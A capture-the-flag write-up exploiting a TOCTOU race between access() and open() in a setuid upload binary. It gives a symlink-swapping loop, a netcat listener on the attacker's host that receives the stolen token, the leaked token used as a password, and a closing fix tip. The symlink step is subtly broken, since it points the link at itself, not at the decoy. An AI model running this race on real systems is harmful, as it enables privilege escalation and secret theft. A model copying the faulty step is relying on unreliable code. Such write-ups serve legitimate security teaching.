
---
### 🔍 Challenge Description

> The binary at `/home/flag10/flag10` uploads any file passed as an argument, **only if the calling user has access to read it**.  
> The program uses `access()` to check permissions — introducing a classic **TOCTOU (Time-Of-Check-To-Time-Of-Use)** vulnerability.

**Login:** `level10 : level10`  
**Target binary:** `/home/flag10/flag10`  
**Hidden file:** `/home/flag10/token` (readable only by `flag10`)

---

### 📜 Source Code Analysis

```c
if(access(argv[1], R_OK) == 0) {
   ...
   ffd = open(file, O_RDONLY);
   ...
}
```

🧠 **Key Insight:**  
`access()` uses the **real UID/GID**, while `open()` uses the **effective UID/GID**.  
This gap allows a **race condition** — check permission on a dummy file, then swap it with the protected file before `open()` is called.

---

### 🎯 Goal

Exploit the time gap between the access check and the file open call to leak the contents of `token` using a symbolic link attack.

---

### ⚔️ Exploitation Plan

#### 🧱 Step 1: Create a Decoy File

```bash
echo "Here I have full access." > /tmp/token
```

#### 🔁 Step 2: Launch a Netcat Listener on Your Host

_On your host machine:_

```bash
nc -lk 18211
```

This will receive the file sent by the vulnerable binary.

#### 🔗 Step 3: Start the Symlink Race (Terminal 1 in VM)

```bash
while true; do
    ln -sf /home/flag10/token /tmp/token
    ln -sf /tmp/token /tmp/token
done
```

Keep toggling the symlink between a **dummy file** and the **real token**.

#### 🚀 Step 4: Rapidly Trigger the Binary (Terminal 2 in VM)

```bash
while true; do
    /home/flag10/flag10 /tmp/token <YOUR-HOST-IP>
done
```

This will keep sending the contents of `/tmp/token` to your host over TCP — eventually during a successful race window, it will grab the protected token.

---

### 🏁 Step 5: Capture the Flag

_On your host (where `nc` is running)_

```bash
.oO Oo.
Here I have full access.
.oO Oo.
Here I have full access.
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27   <-- 🏆 This is the token!
```

---

### 🔐 Step 6: Switch to `flag10` and Win

```bash
ssh flag10@localhost
# password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

Then:

```bash
getflag
```

✅ Output:

```
You have successfully executed getflag on a target account
```

---

### 🧠 Lessons Learned

This level illustrates the danger of **TOCTOU vulnerabilities** — where permission checks and usage are done separately. These are often subtle and timing-dependent but can lead to **severe privilege escalation**.

🛡️ **Security Tip:**

> Replace `access()` checks with direct `open()` calls using appropriate privileges. If a check must be done, do it using the same logic path and UID that performs the final operation.

---
